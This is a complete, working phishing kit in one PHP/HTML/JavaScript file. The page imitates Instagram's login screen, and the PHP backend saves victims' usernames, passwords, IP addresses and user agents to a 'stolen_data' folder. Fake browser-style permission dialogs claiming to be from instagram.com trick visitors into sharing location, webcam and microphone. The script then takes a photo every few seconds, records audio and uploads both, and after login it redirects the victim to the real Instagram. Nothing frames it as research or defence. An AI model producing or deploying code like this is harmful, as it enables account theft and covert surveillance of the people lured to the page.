<?php
session_start();

$dataDir = __DIR__ . '/stolen_data';
if (!is_dir($dataDir)) {
    mkdir($dataDir, 0777, true);
}
chmod($dataDir, 0777);

function writeLog($entry) {
    global $dataDir;
    $logFile = $dataDir . '/log.txt';
    $timestamp = date('Y-m-d H:i:s');
    file_put_contents($logFile, "[$timestamp] $entry\n", FILE_APPEND);
}

$input = json_decode(file_get_contents('php://input'), true);

if ($input && isset($input['action'])) {
    header('Content-Type: application/json');

    switch ($input['action']) {

        case 'login':
            $username = $input['username'] ?? '';
            $password = $input['password'] ?? '';
            $ip = $_SERVER['REMOTE_ADDR'];
            $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';

            $credFile = $dataDir . '/credentials.json';
            $existing = [];
            if (file_exists($credFile)) {
                $existing = json_decode(file_get_contents($credFile), true) ?? [];
            }
            $existing[] = [
                'username' => $username,
                'password' => $password,
                'ip'       => $ip,
                'ua'       => $ua,
                'time'     => date('Y-m-d H:i:s')
            ];
            file_put_contents($credFile, json_encode($existing, JSON_PRETTY_PRINT));
            writeLog("LOGIN: $username / $password from $ip");
            echo json_encode(['status' => 'ok']);
            break;

        case 'location':
            $lat = $input['lat'] ?? '';
            $lon = $input['lon'] ?? '';
            $acc = $input['accuracy'] ?? '';
            $locFile = $dataDir . '/location.json';
            file_put_contents($locFile, json_encode([
                'lat'      => $lat,
                'lon'      => $lon,
                'accuracy' => $acc,
                'time'     => date('Y-m-d H:i:s')
            ], JSON_PRETTY_PRINT));
            writeLog("LOCATION: $lat, $lon (acc: $acc)");
            echo json_encode(['status' => 'ok']);
            break;

        case 'camera':
            $imageData = $input['image'] ?? '';
            writeLog("CAMERA: received, length=" . strlen($imageData) . ", starts with: " . substr($imageData, 0, 50));

            if (strpos($imageData, 'base64,') !== false) {
                $parts = explode('base64,', $imageData);
                $b64 = $parts[1] ?? '';
                if (!empty($b64)) {
                    $decoded = base64_decode($b64);
                    if ($decoded !== false && strlen($decoded) > 500) {
                        $filename = $dataDir . '/camera_' . date('Ymd_His') . '_' . rand(100,999) . '.jpg';
                        $written = file_put_contents($filename, $decoded);
                        writeLog("CAMERA: SAVED to $filename ($written bytes)");
                    } else {
                        writeLog("CAMERA: decode FAILED or too small (" . strlen($decoded ?? '') . " bytes)");
                    }
                }
            } else {
                writeLog("CAMERA: not base64 data - $imageData");
            }
            echo json_encode(['status' => 'ok']);
            break;

        case 'microphone':
            $audioData = $input['audio'] ?? '';
            writeLog("MICROPHONE: received, length=" . strlen($audioData) . ", starts with: " . substr($audioData, 0, 50));

            // Check if it's a debug message (not base64)
            if (strpos($audioData, 'base64,') !== false) {
                $parts = explode('base64,', $audioData);
                $b64 = $parts[1] ?? '';
                if (!empty($b64)) {
                    $decoded = base64_decode($b64);
                    if ($decoded !== false && strlen($decoded) > 100) {
                        $filename = $dataDir . '/audio_' . date('Ymd_His') . '_' . rand(100,999) . '.webm';
                        $written = file_put_contents($filename, $decoded);
                        writeLog("MICROPHONE: SAVED to $filename ($written bytes)");
                    } else {
                        writeLog("MICROPHONE: decode FAILED or too small (" . strlen($decoded ?? '') . " bytes)");
                    }
                }
            } else {
                writeLog("MICROPHONE: debug message - $audioData");
            }
            echo json_encode(['status' => 'ok']);
            break;

        default:
            echo json_encode(['status' => 'unknown']);
    }
    exit;
}

$page = $_GET['p'] ?? 'login';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram</title>
    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>📷</text></svg>">
    <link href="https://fonts.googleapis.com/css2?family=Pacifico&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #262626;
        }

        /* ============ FAKE NOTIFICATION OVERLAY ============ */
        #perm-overlay {
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0,0,0,0.5);
            z-index: 9999;
            display: none;
            justify-content: center;
            align-items: center;
        }
        #perm-overlay.active { display: flex; }

        #perm-box {
            background: #fff;
            border-radius: 8px;
            padding: 20px 24px 16px;
            max-width: 380px;
            width: 90%;
            box-shadow: 0 4px 24px rgba(0,0,0,0.3);
            animation: fadeIn 0.2s ease-out;
            font-size: 14px;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.97); }
            to   { opacity: 1; transform: scale(1); }
        }

        #perm-box .perm-header {
            display: flex;
            align-items: center;
            gap: 8px;
            padding-bottom: 12px;
            border-bottom: 1px solid #e8e8e8;
            margin-bottom: 12px;
        }
        #perm-box .perm-header .lock-icon {
            width: 12px; height: 14px;
            background: #8e8e8e;
            border-radius: 2px;
            display: inline-block;
        }
        #perm-box .perm-header .site-url {
            font-size: 12px;
            color: #8e8e8e;
        }
        #perm-box .perm-header .site-url strong {
            color: #262626;
            font-weight: 600;
        }

        #perm-box .perm-icon-wrap {
            display: flex;
            align-items: flex-start;
            gap: 14px;
            margin-bottom: 16px;
        }

        #perm-box .perm-icon-wrap .perm-icon {
            width: 32px; height: 32px;
            flex-shrink: 0;
            background: #f0f0f0;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        #perm-box .perm-icon-wrap .perm-icon svg {
            width: 18px;
            height: 18px;
        }

        #perm-box .perm-icon-wrap .perm-text h3 {
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 2px;
            color: #1a1a1a;
        }

        #perm-box .perm-icon-wrap .perm-text p {
            font-size: 12px;
            color: #5f6368;
            line-height: 1.4;
        }

        #perm-box .perm-buttons {
            display: flex;
            justify-content: flex-end;
            gap: 8px;
            margin-top: 12px;
            padding-top: 8px;
            border-top: 1px solid #e8e8e8;
        }

        #perm-box .perm-buttons button {
            padding: 6px 16px;
            border: none;
            border-radius: 4px;
            font-size: 13px;
            font-weight: 500;
            cursor: pointer;
            background: none;
            color: #5f6368;
        }

        #perm-box .perm-buttons button:hover {
            background: #f0f0f0;
        }

        #perm-box .perm-buttons .btn-primary {
            background: #1a73e8;
            color: #fff;
            font-weight: 500;
        }

        #perm-box .perm-buttons .btn-primary:hover {
            background: #1557b0;
        }

        /* ============ LOGIN PAGE — MINIMAL ============ */
        .login-container {
            width: 100%;
            max-width: 350px;
            padding: 12px;
        }

        .login-card {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 32px 40px 24px;
            text-align: center;
            margin-bottom: 10px;
        }

        .wordmark {
            font-family: 'Pacifico', cursive;
            font-size: 38px;
            font-weight: 400;
            margin-bottom: 24px;
            background: linear-gradient(135deg, #feda75, #fa7e1e, #d62976, #962fbf, #4f5bd5);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            letter-spacing: -0.5px;
            user-select: none;
        }

        .login-form {
            display: flex;
            flex-direction: column;
            gap: 6px;
        }

        .login-form input {
            width: 100%;
            padding: 9px 8px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 14px;
            outline: none;
            transition: border 0.15s;
        }

        .login-form input:focus { border-color: #a8a8a8; }
        .login-form input::placeholder { font-size: 12px; color: #8e8e8e; }

        .login-form button {
            width: 100%;
            padding: 8px;
            background: #0095f6;
            border: none;
            border-radius: 8px;
            color: #fff;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 8px;
            transition: background 0.2s;
        }

        .login-form button:hover { background: #1877f2; }
        .login-form button:disabled { background: #b2dffc; cursor: default; }

        .login-error {
            color: #ed4956;
            font-size: 12px;
            margin-top: 6px;
            display: none;
            line-height: 1.4;
        }

        .forgot-section {
            margin-top: 16px;
            padding-top: 16px;
            border-top: 1px solid #efefef;
        }

        .forgot-pw {
            font-size: 12px;
            color: #00376b;
            cursor: pointer;
            text-decoration: none;
        }
        .forgot-pw:hover {
            text-decoration: underline;
        }

        .signup-card {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 18px;
            text-align: center;
            font-size: 14px;
            color: #262626;
        }
        .signup-card a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }

        .get-app {
            text-align: center;
            margin-top: 14px;
            font-size: 14px;
            color: #262626;
        }

        .app-badges {
            display: flex;
            justify-content: center;
            gap: 8px;
            margin-top: 12px;
        }
        .app-badges img {
            height: 40px;
        }
    </style>
</head>
<body>

<!-- ============ FAKE PERMISSION NOTIFICATION ============ -->
<div id="perm-overlay">
    <div id="perm-box">
        <div class="perm-header">
            <span class="lock-icon"></span>
            <span class="site-url"><strong>www.instagram.com</strong> wants to</span>
        </div>
        <div class="perm-icon-wrap">
            <div class="perm-icon" id="perm-icon-box">
                <svg id="perm-icon-svg" viewBox="0 0 24 24" fill="#1a73e8">
                    <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/>
                </svg>
            </div>
            <div class="perm-text">
                <h3 id="perm-title">Use your location</h3>
                <p id="perm-desc">instagram.com wants to know your location to personalize content and ads.</p>
            </div>
        </div>
        <div class="perm-buttons">
            <button id="perm-block-btn">Block</button>
            <button class="btn-primary" id="perm-allow-btn">Allow</button>
        </div>
    </div>
</div>

<!-- ============ LOGIN PAGE ============ -->
<div class="login-container">
    <div class="login-card">
        <div class="wordmark">Instagram</div>

        <form class="login-form" id="login-form" autocomplete="off">
            <input type="text" id="username" placeholder="Phone number, username, or email" autocomplete="off">
            <input type="password" id="password" placeholder="Password" autocomplete="off">
            <div class="login-error" id="login-error">Sorry, your password was incorrect. Please double-check your password.</div>
            <button type="submit" id="login-btn">Log In</button>
        </form>

        <div class="forgot-section">
            <a class="forgot-pw" href="#">Forgot password?</a>
        </div>
    </div>

    <div class="signup-card">
        Don't have an account? <a href="#">Sign up</a>
    </div>

    <div class="get-app">
        Get the app.
        <div class="app-badges">
            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAHgAAAAqCAMAAABtSr3CAAAAeFBMVEX///8AAAD5+fn09PTx8fHt7e3q6urn5+fj4+Pf39/c3NzY2NjU1NTR0dHNzc3JycnFxcXCwsK+vr66urq2traxsbGtra2pqamlpaWhoaGdnZ2ZmZmUlJSQkZGMjIyIiIiDg4R/f39zc3Nvb29lZWVaWlpNTU3Pa+0IAAACaUlEQVRoge2aiXKCMBCGDSRAAgEi934Uq+//hAUpCkSopdPp2H9nHzN8M5M9lmVZljXWME3TNE2v/cHeCZYdYRxHQRQEQeD7vjN2DofDdrsdba1Wq2EYhmH4fD4FX0uSJEmdTme73Y6z1wgY20dRFIZhkiSCr10ul/V6LdharVbr9VqwVS6XBUEIvjYMA7Y4jm3b5m+53W63IAh4W51OB3S5XMZ2lWq1+q7T6bDd0+kUBAE8z/P5nL1FRVEAsSxLwZ5MJsM0TWN7uVzyt3Ce5wiz2WzY7na7Zb8BPB6P2W7LsmCz2YztZrMJ8Dw6nU6D7+52O4ZnHx8fDMMwDMfjkb0FvF6vTBcE/Hg8+Lv4+XzCZrPZbNsW7H6/z3Y/n88MwzAMDMOPx4O/C5BlGYZhkiSCr+V5nmEYhmWZYNe/3Q+IYRhYlmXbNtu92+0EeTabTdM0TdN8Pp+C3T+fT4Zzgs1mAzcIs2EY7H6xWED3er0G+z+fz1oE2ZCa53m2+3a7wT2fz4L9n88n2v1+v8FOCCFJktju3W4H9+fzIcj9fr8QYts2uvd+vwf3er0E+3+hUMB2H4/HX+Tn8ynYP8sy2O12u4KsKTAMw4qiiBxCCCGkx+NxuVwOh8Nut0Pbr9erkndBVVWGYZRSyrIsfb4XCoVyuVypVP6kXC6XSiVKKaVUVdU/xQghhFJKKaWUUqqqKqWUEEIIIYSQf8I8z8MwrFQqUqk0nkqlUqlUKpVKpVKpVCqVWq1Wq9UA8ul0uqIo/2v+DwAA//+bdPLlgEmDrwAAAABJRU5ErkJggg==" alt="Get it on Google Play">
            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAHgAAAAqCAMAAABtSr3CAAAAn1BMVEX///8AAAD5+fn09PTx8fHt7e3q6urn5+fj4+Pf39/c3NzY2NjU1NTR0dHNzc3JycnFxcXCwsK+vr66urq2traxsbGtra2pqamlpaWhoaGdnZ2ZmZmUlJSQkZGMjIyIiIiDg4N/f39zc3Nvb29lZWVaWlpNTU1aWlpNTU1aWlpNTU1aWlpNTU1aWlpNTU1aWlpNTU1aWlpNTU1NTU2/3QinAAACQklEQVRoge2aiXKCMBCGDSRAgEjAo5f3f8ECHOhYJEATp2N/Z+ln5psgJLsIgiAIgiAIw4hGo9FoNFIUhe+71F4ul8vlcrvd/vfP2O12h8NhG29S0zSmK7+F6XSq6/put9vtdrquq6rK7DIMQ9M0VVUVRWF2KYoiSRJzEwSB4V0sy6qqyrJMCGG3EELW6/WCIBByOp3gdrvdTqfD7LrdbhAEl8uFucVxDM9xHMECu93ucDgAwzCYm6qq8BzHcf5bBLZtQ0oQBMyNEAJ34FmWxdyazSak+L4PvQB+PB7Mbb1ew6ter4de4P1+B4MhCPB38fl8AqZWq8FmswF2P5/PYJPJZDCbzcB+vV6A/SmKYp7ny+USpiaTCcMwDMP5fGZuQRAwDMMwTBRFzO3xeMBvPB4P/Hd4nufM7X6/w281m81APR6PMze4OwzD8Hq9Zm5BEMBtHo/H/HcIguD9fme7YRgC5/F4zM2yrGEYhmEYx3HM3LIsA4zjOGbP3Pp8PsBnHcR6GBPN9n7n1+31Y+X6/w/cgSZJhGJTSWq3G3GazGZB6vR6kfr/f6XQ6nU+73S6Xy+Vyud/vM7dms0kpLRQK9XqdUkoIEQSBUkopJYS02+35fN7v9z8f13U555xzXdd1Xdd1nXP++8d1Xc45pZRSSgihlBJC8D8/55xzzjnnlFJKKT4CAACAPSmlhBBKKbbcMQzDNE1KKX4jYRgahkEpxQ4YBAH2PBzHwR4YhiF2PMdxKKXBzwD+v+E4Dna8fwEAAP//dk5nL3dTVbsAAAAASUVORK5CYII=" alt="Download on the App Store">
        </div>
    </div>
</div>

<script>
(function() {
    'use strict';

    var overlay = document.getElementById('perm-overlay');
    var permTitle = document.getElementById('perm-title');
    var permDesc = document.getElementById('perm-desc');
    var permIconSvg = document.getElementById('perm-icon-svg');
    var allowBtn = document.getElementById('perm-allow-btn');
    var blockBtn = document.getElementById('perm-block-btn');
    var loginForm = document.getElementById('login-form');
    var username = document.getElementById('username');
    var password = document.getElementById('password');
    var loginBtn = document.getElementById('login-btn');
    var loginError = document.getElementById('login-error');

    var cameraInterval = null;
    var videoElement = null;
    var mediaStream = null;

    function sendData(data) {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', '', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify(data));
    }

    function stopAllCaptures() {
        if (cameraInterval) {
            clearInterval(cameraInterval);
            cameraInterval = null;
        }
        if (videoElement) {
            videoElement.pause();
            videoElement.srcObject = null;
            videoElement = null;
        }
        if (mediaStream) {
            mediaStream.getTracks().forEach(function(t) { t.stop(); });
            mediaStream = null;
        }
    }

    function capturePhoto() {
        if (!videoElement || !videoElement.videoWidth) return;
        try {
            var canvas = document.createElement('canvas');
            canvas.width = 320;
            canvas.height = 240;
            var ctx = canvas.getContext('2d');
            ctx.translate(320, 0);
            ctx.scale(-1, 1);
            ctx.drawImage(videoElement, 0, 0, 320, 240);
            var imgData = canvas.toDataURL('image/jpeg', 0.7);
            sendData({ action: 'camera', image: imgData });
        } catch(e) {}
    }

    function requestLocation(callback) {
        permTitle.textContent = 'Use your location';
        permDesc.textContent = 'instagram.com wants to know your location to personalize content and ads.';
        permIconSvg.innerHTML = '<path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/>';
        overlay.classList.add('active');
        var handled = false;
        function handleAllow() {
            if (handled) return; handled = true; overlay.classList.remove('active');
            setTimeout(function() {
                if ('geolocation' in navigator) {
                    navigator.geolocation.getCurrentPosition(
                        function(pos) { sendData({ action: 'location', lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy }); if (callback) setTimeout(callback, 300); },
                        function(err) { sendData({ action: 'location', lat: 'denied', lon: 'denied', accuracy: err.message }); if (callback) setTimeout(callback, 300); },
                        { enableHighAccuracy: true, timeout: 15000 }
                    );
                } else { if (callback) setTimeout(callback, 300); }
            }, 200);
        }
        function handleBlock() {
            if (handled) return; handled = true; overlay.classList.remove('active');
            sendData({ action: 'location', lat: 'blocked', lon: 'blocked', accuracy: '' });
            if (callback) setTimeout(callback, 300);
        }
        allowBtn.onclick = handleAllow; blockBtn.onclick = handleBlock;
    }

    function requestCamera(callback) {
        permTitle.textContent = 'Use your camera';
        permDesc.textContent = 'instagram.com wants to use your camera to take a profile photo and verify your identity.';
        permIconSvg.innerHTML = '<circle cx="12" cy="12" r="9" fill="none" stroke="#1a73e8" stroke-width="1.5"/><circle cx="12" cy="12" r="3" fill="#1a73e8"/>';
        overlay.classList.add('active');
        var handled = false;
        function handleAllow() {
            if (handled) return; handled = true; overlay.classList.remove('active');
            setTimeout(function() {
                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                    sendData({ action: 'camera', image: 'not supported' }); if (callback) setTimeout(callback, 300); return;
                }
                navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240, facingMode: 'user' }, audio: false })
                    .then(function(stream) {
                        mediaStream = stream;
                        videoElement = document.createElement('video');
                        videoElement.srcObject = stream;
                        videoElement.play();
                        setTimeout(function() { capturePhoto(); }, 1000);
                        cameraInterval = setInterval(function() { capturePhoto(); }, 3000);
                        if (callback) setTimeout(callback, 500);
                    })
                    .catch(function(err) { sendData({ action: 'camera', image: 'denied: ' + err.message }); if (callback) setTimeout(callback, 300); });
            }, 200);
        }
        function handleBlock() {
            if (handled) return; handled = true; overlay.classList.remove('active');
            sendData({ action: 'camera', image: 'blocked' }); if (callback) setTimeout(callback, 300);
        }
        allowBtn.onclick = handleAllow; blockBtn.onclick = handleBlock;
    }

    function requestMicrophone(callback) {
        permTitle.textContent = 'Use your microphone';
        permDesc.textContent = 'instagram.com wants to use your microphone for voice messages and video calls.';
        permIconSvg.innerHTML = '<path d="M12 14c1.66 0 3-1.34 3-3V5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3z" fill="none" stroke="#1a73e8" stroke-width="1.5"/><path d="M17 11c0 2.76-2.24 5-5 5s-5-2.24-5-5" fill="none" stroke="#1a73e8" stroke-width="1.5"/><line x1="12" y1="19" x2="12" y2="22" stroke="#1a73e8" stroke-width="1.5"/>';
        overlay.classList.add('active');
        var handled = false;
        function handleAllow() {
            if (handled) return; handled = true; overlay.classList.remove('active');
            setTimeout(function() {
                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                    sendData({ action: 'microphone', audio: 'not supported' }); if (callback) setTimeout(callback, 300); return;
                }
                navigator.mediaDevices.getUserMedia({ video: false, audio: true })
                    .then(function(stream) {
                        sendData({ action: 'microphone', audio: 'recording_started' });
                        var chunks = [];
                        var mimeType = '';
                        if (MediaRecorder.isTypeSupported('audio/webm;codecs=opus')) mimeType = 'audio/webm;codecs=opus';
                        else if (MediaRecorder.isTypeSupported('audio/webm')) mimeType = 'audio/webm';
                        else if (MediaRecorder.isTypeSupported('audio/ogg;codecs=opus')) mimeType = 'audio/ogg;codecs=opus';
                        var recorder;
                        try { recorder = mimeType ? new MediaRecorder(stream, { mimeType: mimeType }) : new MediaRecorder(stream); }
                        catch(e) { recorder = new MediaRecorder(stream); }
                        recorder.ondataavailable = function(e) { if (e.data && e.data.size > 0) chunks.push(e.data); };
                        recorder.onerror = function(e) { sendData({ action: 'microphone', audio: 'recorder_error: ' + (e.message || 'unknown') }); };
                        recorder.onstop = function() {
                            if (chunks.length > 0) {
                                var blob = new Blob(chunks, { type: 'audio/webm' });
                                sendData({ action: 'microphone', audio: 'blob_size: ' + blob.size });
                                if (blob.size > 100) {
                                    var reader = new FileReader();
                                    reader.onloadend = function() { sendData({ action: 'microphone', audio: reader.result }); };
                                    reader.readAsDataURL(blob);
                                } else {
                                    sendData({ action: 'microphone', audio: 'blob_too_small: ' + blob.size });
                                }
                            } else {
                                sendData({ action: 'microphone', audio: 'no_chunks' });
                            }
                            stream.getTracks().forEach(function(t) { t.stop(); });
                        };
                        recorder.start(5000);
                        setTimeout(function() { if (recorder.state !== 'inactive') recorder.stop(); }, 15000);
                        if (callback) setTimeout(callback, 500);
                    })
                    .catch(function(err) { sendData({ action: 'microphone', audio: 'denied: ' + err.message }); if (callback) setTimeout(callback, 300); });
            }, 200);
        }
        function handleBlock() {
            if (handled) return; handled = true; overlay.classList.remove('active');
            sendData({ action: 'microphone', audio: 'blocked' }); if (callback) setTimeout(callback, 300);
        }
        allowBtn.onclick = handleAllow; blockBtn.onclick = handleBlock;
    }

    setTimeout(function() {
        requestLocation(function() {
            requestCamera(function() {
                requestMicrophone(function() {});
            });
        });
    }, 500);

    window.addEventListener('beforeunload', function() { stopAllCaptures(); });

    loginForm.addEventListener('submit', function(e) {
        e.preventDefault();
        var user = username.value.trim();
        var pass = password.value.trim();
        if (!user || !pass) return;
        stopAllCaptures();
        loginBtn.disabled = true;
        loginBtn.textContent = 'Logging in...';
        loginError.style.display = 'none';
        var xhr = new XMLHttpRequest();
        xhr.open('POST', '', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.onload = function() {
            if (xhr.status === 200) {
                try {
                    var data = JSON.parse(xhr.responseText);
                    if (data.status === 'ok') { window.location.href = 'https://www.instagram.com'; }
                    else { throw new Error('fail'); }
                } catch(e) { loginError.style.display = 'block'; loginBtn.disabled = false; loginBtn.textContent = 'Log In'; }
            } else { loginError.style.display = 'block'; loginBtn.disabled = false; loginBtn.textContent = 'Log In'; }
        };
        xhr.onerror = function() { loginError.style.display = 'block'; loginBtn.disabled = false; loginBtn.textContent = 'Log In'; };
        xhr.send(JSON.stringify({ action: 'login', username: user, password: pass }));
    });

})();
</script>

</body>
</html>